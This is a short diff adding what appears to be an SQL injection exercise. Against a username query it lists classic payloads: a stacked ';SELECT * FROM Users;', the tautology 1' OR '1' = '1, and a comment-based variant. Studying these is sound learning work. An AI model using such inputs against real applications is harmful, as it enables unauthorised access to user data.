@@ -1,0 +1,12 @@
+Modify the query to pass in SQL to get all users:
+
+SELECT *
+FROM Users
+WHERE Username='???'
+
+;SELECT * FROM Users;
+1' OR '1' = '1
+--; SELECT * FROM Users;
+OR '1' = '1'
+
+> 1' OR '1' = '1
